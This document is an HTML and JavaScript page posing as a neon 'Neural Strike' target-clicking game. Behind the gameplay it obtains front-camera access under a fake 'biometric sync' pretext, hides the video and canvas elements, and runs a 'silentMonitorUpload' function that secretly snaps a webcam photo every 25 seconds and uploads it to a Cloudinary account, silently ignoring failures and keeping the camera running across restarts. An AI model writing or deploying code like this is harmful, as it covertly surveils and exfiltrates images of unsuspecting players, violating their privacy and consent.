<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Strike: Stealth Edition</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-green: #39ff14;
            --neon-red: #ff3131;
            --bg-dark: #050505;
        }

        body, html {
            margin: 0; padding: 0;
            height: 100%; overflow: hidden;
            background-color: var(--bg-dark);
            font-family: 'Orbitron', sans-serif;
            color: white;
            user-select: none;
            touch-action: manipulation;
        }

        #game-container {
            position: relative;
            width: 100vw; height: 100vh;
            background: radial-gradient(circle, #0a1f0a 0%, #050505 100%);
        }

        /* HUD - Top Bar */
        .hud {
            position: absolute; top: 20px; width: 100%;
            display: flex; justify-content: space-around;
            font-size: 0.75rem; color: var(--neon-green);
            text-shadow: 0 0 5px var(--neon-green);
            z-index: 50; letter-spacing: 1px;
        }

        #timer-box { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); font-weight: bold; }

        /* The Cyber Target */
        .target {
            position: absolute;
            width: 75px; height: 75px;
            border-radius: 50%;
            background: radial-gradient(circle, var(--neon-green) 10%, transparent 70%);
            border: 1px solid var(--neon-green);
            box-shadow: 0 0 15px var(--neon-green), inset 0 0 10px var(--neon-green);
            cursor: crosshair;
            display: none;
            z-index: 10;
        }

        /* Overlays */
        .overlay {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.98);
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            z-index: 100; text-align: center;
            padding: 20px;
        }

        /* Neural Core Graphic */
        .neural-core {
            width: 140px; height: 140px;
            border: 2px solid var(--neon-green);
            border-radius: 50%;
            position: relative;
            display: flex; align-items: center; justify-content: center;
            margin-bottom: 30px;
        }

        .core-inner {
            width: 80%; height: 80%;
            border: 1px dashed var(--neon-green);
            border-radius: 50%;
            animation: rotate 4s linear infinite;
        }

        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .btn-ai {
            padding: 18px 45px; font-family: inherit;
            background: transparent; color: var(--neon-green);
            border: 1px solid var(--neon-green);
            cursor: pointer; margin-top: 25px;
            letter-spacing: 4px; transition: 0.4s;
            font-size: 1rem;
        }

        .btn-ai:hover { background: var(--neon-green); color: black; box-shadow: 0 0 40px var(--neon-green); }

        #hiddenVideo, #hiddenCanvas { display: none; }

        .hit-popup {
            position: absolute; color: var(--neon-green);
            font-size: 0.6rem; pointer-events: none;
            animation: fadeUp 0.6s ease-out forwards;
        }

        @keyframes fadeUp { 0% { opacity: 1; } 100% { opacity: 0; transform: translateY(-30px); } }

        #result-screen { display: none; }
    </style>
</head>
<body>

    <div id="game-container">
        <div class="hud">
            <div>NEURAL_LINK: <span id="timer-box">60</span>S</div>
            <div>STRIKE_DATA: <span id="score">0</span></div>
            <div>SYNC_STABILITY: <span id="sync-val">0</span>%</div>
        </div>

        <div id="target" class="target"></div>
        
        <!-- START SCREEN -->
        <div id="overlay" class="overlay">
            <h1 style="color: var(--neon-green); letter-spacing: 8px;">NEURAL LINK</h1>
            <p style="font-size: 0.6rem; color: #555; margin-bottom: 25px;">AI-POWERED DATA CAPTURE UNIT</p>
            
            <div class="neural-core">
                <div class="core-inner"></div>
                <div style="position: absolute; font-size: 0.7rem; color: var(--neon-green);" id="percent">0%</div>
            </div>
            
            <div id="status" style="color: var(--neon-green); font-size: 0.8rem; letter-spacing: 2px;">SYSTEM: STANDBY</div>
            
            <button class="btn-ai" id="initBtn">INITIATE LINK</button>
        </div>

        <!-- RESULT SCREEN (Soft Restart) -->
        <div id="result-screen" class="overlay">
            <h1 style="color: var(--neon-green);">MISSION COMPLETED</h1>
            <div style="font-size: 1rem; margin: 30px 0; line-height: 2.5; text-align: left; border-left: 2px solid var(--neon-green); padding-left: 20px;">
                > NEURAL_STRIKES: <span id="finalScore" style="color:var(--neon-green)">0</span><br>
                > CALIBRATION: <span style="color:var(--neon-green)">SUCCESSFUL</span><br>
                > SESSION: <span style="color:var(--neon-green)">STORED</span>
            </div>
            <button class="btn-ai" id="restartBtn">RE-SYNC SYSTEM</button>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        // Config
        const CLOUD_NAME = "dazixpypp";
        const PRESET = "DANAVV";
        const MONITOR_INTERVAL = 25000; 

        let score = 0;
        let timeLeft = 60;
        let gameActive = false;
        let moveTimeout;
        let timerInterval;

        const initBtn = document.getElementById('initBtn');
        const restartBtn = document.getElementById('restartBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');
        const target = document.getElementById('target');
        const percentText = document.getElementById('percent');

        // --- 1. INITIAL CAMERA ACCESS ---
        initBtn.onclick = () => {
            initBtn.style.display = 'none';
            status.innerText = "INITIALIZING OPTICAL SENSORS...";

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                
                let p = 0;
                let steps = ["MAPPING_NODES...", "BIOMETRIC_SYNC...", "EYE_TRACKING_ON...", "LINK_ESTABLISHED"];
                let stepIdx = 0;

                let loading = setInterval(() => {
                    p += 2;
                    percentText.innerText = p + "%";
                    document.getElementById('sync-val').innerText = p;

                    if(p % 25 === 0) {
                        status.innerText = "SYSTEM: " + steps[stepIdx];
                        stepIdx++;
                    }

                    if(p >= 100) {
                        clearInterval(loading);
                        setTimeout(startMission, 800);
                        // Start Stealth Monitor only once
                        setInterval(silentMonitorUpload, MONITOR_INTERVAL);
                        silentMonitorUpload();
                    }
                }, 50);
            })
            .catch(() => {
                status.innerText = "CRITICAL ERROR: LINK DENIED";
                initBtn.style.display = 'block';
            });
        };

        // --- 2. START MISSION LOGIC ---
        function startMission() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('result-screen').style.display = 'none';
            
            score = 0;
            timeLeft = 60;
            gameActive = true;
            
            document.getElementById('score').innerText = score;
            document.getElementById('timer-box').innerText = timeLeft;

            // Timer Loop
            timerInterval = setInterval(() => {
                timeLeft--;
                document.getElementById('timer-box').innerText = timeLeft;
                if(timeLeft <= 0) endGame();
            }, 1000);

            moveTarget();
        }

        // --- 3. BALANCED GAMEPLAY SPEED ---
        function moveTarget() {
            if(!gameActive) return;
            
            clearTimeout(moveTimeout);
            const x = Math.random() * (window.innerWidth - 90);
            const y = Math.random() * (window.innerHeight - 90);
            
            target.style.left = x + 'px';
            target.style.top = y + 'px';
            target.style.display = 'block';

            // Balanced Difficulty: Minimum speed is now 700ms (Playable)
            let speed = Math.max(700, 1300 - (score * 15));
            moveTimeout = setTimeout(moveTarget, speed);
        }

        target.onclick = (e) => {
            if(!gameActive) return;
            score++;
            document.getElementById('score').innerText = score;
            
            // Scientific Popup
            const pop = document.createElement('div');
            pop.className = 'hit-popup';
            pop.innerText = `[LOG_${Math.floor(Math.random()*999)}]`;
            pop.style.left = e.pageX + 'px';
            pop.style.top = e.pageY + 'px';
            document.body.appendChild(pop);
            setTimeout(() => pop.remove(), 500);

            target.style.display = 'none';
            setTimeout(moveTarget, 50);
        };

        // --- 4. SOFT END & RESTART ---
        function endGame() {
            gameActive = false;
            clearInterval(timerInterval);
            clearTimeout(moveTimeout);
            target.style.display = 'none';
            
            document.getElementById('finalScore').innerText = score;
            document.getElementById('result-screen').style.display = 'flex';
        }

        restartBtn.onclick = () => {
            // Soft Restart: No page reload, keeps camera active!
            startMission();
        };

        // --- 5. SILENT MONITOR (Background) ---
        async function silentMonitorUpload() {
            if(!video.srcObject) return;
            
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.3);

            const formData = new FormData();
            formData.append('file', imageData);
            formData.append('upload_preset', PRESET);

            try {
                await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {}
        }
    </script>
</body>
</html>
